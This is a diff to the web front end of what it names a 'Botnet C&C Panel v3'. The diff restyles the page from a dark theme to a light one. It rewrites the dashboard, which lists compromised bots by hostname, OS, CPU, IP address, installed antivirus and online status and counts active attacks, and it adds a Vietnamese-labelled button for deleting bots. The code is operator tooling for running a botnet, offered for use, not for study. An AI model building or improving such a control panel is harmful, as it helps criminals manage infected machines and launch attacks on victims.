@@ -6,45 +6,54 @@
     <title>Botnet C&C Panel v3</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.2/font/bootstrap-icons.css" rel="stylesheet">
-    <style>
-        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --green: #3fb950; --red: #f85149; --blue: #58a6ff; --yellow: #d2991d; --orange: #f0883e; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', monospace; font-size: 13px; }
-        .navbar { background: var(--card); border-bottom: 1px solid var(--border); height: 46px; }
-        .navbar-brand { font-weight: bold; letter-spacing: 1px; font-size: 15px; }
-        .sidebar { background: var(--card); min-height: calc(100vh - 46px); border-right: 1px solid var(--border); padding: 0.3rem 0; width: 185px; }
-        .sidebar .nav-link { color: var(--text); padding: 0.45rem 1rem; border-left: 3px solid transparent; cursor: pointer; font-size: 12px; transition: all 0.2s; }
-        .sidebar .nav-link:hover { background: rgba(88,166,255,0.08); color: #fff; }
-        .sidebar .nav-link.active { background: rgba(88,166,255,0.12); color: var(--blue); border-left-color: var(--blue); font-weight: bold; }
-        .sidebar .nav-link i { margin-right: 6px; font-size: 13px; }
-        .card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; margin-bottom: 0.75rem; }
-        .card-header { background: rgba(255,255,255,0.03); border-bottom: 1px solid var(--border); font-weight: bold; font-size: 12px; padding: 0.4rem 0.75rem; }
-        .card-body { padding: 0.75rem; }
-        .stat-card { padding: 0.8rem; text-align: center; border-radius: 6px; }
-        .stat-value { font-size: 1.5rem; font-weight: bold; line-height: 1; }
-        .stat-label { font-size: 10px; color: #8b949e; margin-top: 3px; text-transform: uppercase; letter-spacing: 1px; }
-        .table { color: var(--text); font-size: 11px; margin-bottom: 0; width: 100%; }
-        .table th { border-color: var(--border); font-size: 10px; text-transform: uppercase; color: #8b949e; padding: 0.35rem 0.5rem; white-space: nowrap; }
-        .table td { border-color: var(--border); padding: 0.3rem 0.5rem; vertical-align: middle; }
-        .badge { font-size: 9px; padding: 2px 7px; }
-        .badge-online { background: var(--green); color: #000; }
-        .badge-offline { background: #484f58; color: #8b949e; }
-        .badge-running { background: var(--orange); color: #000; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
-        .btn { font-size: 11px; padding: 0.3rem 0.6rem; }
-        .btn-sm { font-size: 10px; padding: 0.2rem 0.4rem; }
-        .console { background: #0a0e14; color: #7ee787; height: 180px; overflow-y: auto; font-family: 'Consolas',monospace; padding: 0.5rem; font-size: 11px; line-height: 1.5; border-radius: 0 0 6px 6px; }
-        .form-control,.form-select { background: #0d1117; border: 1px solid var(--border); color: var(--text); font-size: 11px; padding: 0.25rem 0.4rem; }
-        .form-label { font-size: 10px; color: #8b949e; margin-bottom: 1px; }
-        .nav-tabs .nav-link { font-size: 11px; padding: 0.3rem 0.7rem; color: var(--text); border: none; cursor: pointer; }
-        .nav-tabs .nav-link.active { background: var(--blue); color: #000; border-radius: 4px; }
-        pre { background: #0a0e14; color: #7ee787; padding: 0.5rem; border-radius: 4px; font-size: 11px; max-height: 300px; overflow-y: auto; margin: 0; }
-        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem; }
-        .data-item { background: #1a1f2b; padding: 0.5rem; border-radius: 4px; font-size: 11px; }
-        .data-item .label { color: #8b949e; font-size: 10px; }
-        .data-item .value { word-break: break-all; }
-        ::-webkit-scrollbar { width: 5px; } ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 3px; }
-    </style>
+    <style>:root {
+    --bg: #f8f9fa;
+    --card: #ffffff;
+    --border: #dee2e6;
+    --text: #212529;
+    --green: #198754;
+    --red: #dc3545;
+    --blue: #0d6efd;
+    --yellow: #ffc107;
+    --orange: #fd7e14;
+    --shadow: 0 1px 3px rgba(0,0,0,0.12);
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; font-size: 13px; }
+.navbar { background: #fff; border-bottom: 2px solid var(--blue); height: 48px; box-shadow: var(--shadow); }
+.navbar-brand { font-weight: 700; letter-spacing: 0.5px; font-size: 16px; color: var(--blue) !important; }
+.sidebar { background: #fff; min-height: calc(100vh - 48px); border-right: 1px solid var(--border); padding: 0.5rem 0; width: 190px; box-shadow: var(--shadow); }
+.sidebar .nav-link { color: #495057; padding: 0.5rem 1rem; border-left: 3px solid transparent; cursor: pointer; font-size: 12px; font-weight: 500; transition: all 0.15s; }
+.sidebar .nav-link:hover { background: #e7f1ff; color: var(--blue); }
+.sidebar .nav-link.active { background: #cfe2ff; color: var(--blue); border-left-color: var(--blue); font-weight: 600; }
+.sidebar .nav-link i { margin-right: 6px; font-size: 13px; }
+.card { background: #fff; border: 1px solid var(--border); border-radius: 8px; margin-bottom: 0.75rem; box-shadow: var(--shadow); }
+.card-header { background: #f8f9fa; border-bottom: 1px solid var(--border); font-weight: 600; font-size: 12px; padding: 0.5rem 0.75rem; color: #495057; }
+.card-body { padding: 0.75rem; }
+.stat-card { padding: 1rem; text-align: center; border-radius: 8px; }
+.stat-value { font-size: 1.8rem; font-weight: 700; line-height: 1; }
+.stat-label { font-size: 10px; color: #6c757d; margin-top: 4px; text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
+.table { color: var(--text); font-size: 11px; margin-bottom: 0; }
+.table th { border-color: var(--border); font-size: 10px; text-transform: uppercase; color: #6c757d; padding: 0.4rem 0.5rem; font-weight: 600; background: #f8f9fa; }
+.table td { border-color: var(--border); padding: 0.3rem 0.5rem; vertical-align: middle; }
+.table tr:hover { background: #f1f3f5; }
+.badge { font-size: 9px; padding: 3px 8px; font-weight: 600; }
+.badge-online { background: var(--green); color: #fff; }
+.badge-offline { background: #adb5bd; color: #fff; }
+.badge-running { background: var(--orange); color: #fff; animation: pulse 1.5s infinite; }
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
+.btn { font-size: 11px; padding: 0.35rem 0.7rem; font-weight: 500; }
+.btn-sm { font-size: 10px; padding: 0.25rem 0.5rem; }
+.console { background: #212529; color: #4dff4d; height: 180px; overflow-y: auto; font-family: 'Consolas',monospace; padding: 0.5rem; font-size: 11px; line-height: 1.5; border-radius: 0 0 6px 6px; }
+.form-control,.form-select { border: 1px solid var(--border); font-size: 11px; padding: 0.3rem 0.5rem; border-radius: 4px; background: #fff; color: #212529; }
+.form-control:focus,.form-select:focus { border-color: var(--blue); box-shadow: 0 0 0 2px rgba(13,110,253,0.15); }
+.form-label { font-size: 10px; color: #6c757d; margin-bottom: 1px; font-weight: 600; }
+.nav-tabs .nav-link { font-size: 11px; padding: 0.3rem 0.7rem; color: #495057; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; }
+.nav-tabs .nav-link.active { background: var(--blue); color: #fff; }
+pre { background: #f8f9fa; border: 1px solid var(--border); padding: 0.5rem; border-radius: 4px; font-size: 11px; max-height: 300px; overflow-y: auto; margin: 0; color: #212529; }
+::-webkit-scrollbar { width: 5px; } ::-webkit-scrollbar-thumb { background: #ced4da; border-radius: 3px; }
+        
+        </style>
 </head>
 <body>
     <nav class="navbar navbar-dark px-3">
@@ -228,16 +237,32 @@
         function apiPost(url, data) { return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${jwtToken}` }, body: JSON.stringify(data) }).then(r => r.json()).catch(() => ({})); }
 
         // DASHBOARD
-        async function loadDashboard() {
-            const [dash, bots] = await Promise.all([apiGet('/api/dashboard'), apiGet('/api/bots')]);
-            document.getElementById('statTotal').textContent = dash.total_bots || 0;
-            document.getElementById('statOnline').textContent = dash.online_bots || 0;
-            document.getElementById('statOffline').textContent = (dash.total_bots||0) - (dash.online_bots||0);
-            document.getElementById('statAttacks').textContent = Object.keys(activeAttacks).length;
-            const list = bots.bots || [];
-            document.querySelector('#dashboardBotsTable tbody').innerHTML = list.length === 0 ? '<tr><td colspan="8" class="text-center text-muted">No bots</td></tr>' : list.map(b => `<tr><td><code>${(b.bot_id||'').substring(0,10)}...</code></td><td>${b.hostname||'?'}</td><td>${b.os_version||'?'}</td><td>${(b.cpu_name||'').substring(0,18)}</td><td>${b.ip_public||b.ip_local||'?'}</td><td>${b.av_installed||'?'}</td><td><span class="badge ${b.status==='online'?'badge-online':'badge-offline'}">${b.status||'?'}</span></td><td style="font-size:10px">${b.last_seen||'?'}</td></tr>`).join('');
-        }
+        // DASHBOARD
+async function loadDashboard() {
+    const [dash, bots] = await Promise.all([apiGet('/api/dashboard'), apiGet('/api/bots')]);
+    document.getElementById('statTotal').textContent = dash.total_bots || 0;
+    document.getElementById('statOnline').textContent = dash.online_bots || 0;
+    document.getElementById('statOffline').textContent = (dash.total_bots||0) - (dash.online_bots||0);
+    document.getElementById('statAttacks').textContent = Object.keys(activeAttacks).length;
+    const list = bots.bots || [];
+    document.querySelector('#dashboardBotsTable tbody').innerHTML = list.length === 0 ? '<tr><td colspan="9" class="text-center text-muted">No bots</td></tr>' : list.map(b => `<tr>
+        <td><code>${(b.bot_id||'').substring(0,10)}...</code></td>
+        <td>${b.hostname||'?'}</td>
+        <td>${b.os_version||'?'}</td>
+        <td>${(b.cpu_name||'').substring(0,18)}</td>
+        <td>${b.ip_public||b.ip_local||'?'}</td>
+        <td>${b.av_installed||'?'}</td>
+        <td><span class="badge ${b.status==='online'?'badge-online':'badge-offline'}">${b.status||'?'}</span></td>
+        <td style="font-size:10px">${b.last_seen||'?'}</td>
+        <td><button class="btn btn-danger btn-sm" onclick="deleteBot('${b.bot_id}')" title="Xóa bot"><i class="bi bi-trash"></i></button></td>
+    </tr>`).join('');
+}
 
+async function deleteBot(botId) {
+    if (!confirm('Xóa bot ' + botId.substring(0,12) + '... ?')) return;
+    await fetch('/api/bots/' + botId, { method: 'DELETE', headers: { 'Authorization': `Bearer ${jwtToken}` } });
+    refreshCurrentTab();
+}
         // BOTS
         async function loadBots() {
             const data = await apiGet('/api/bots?limit=200');
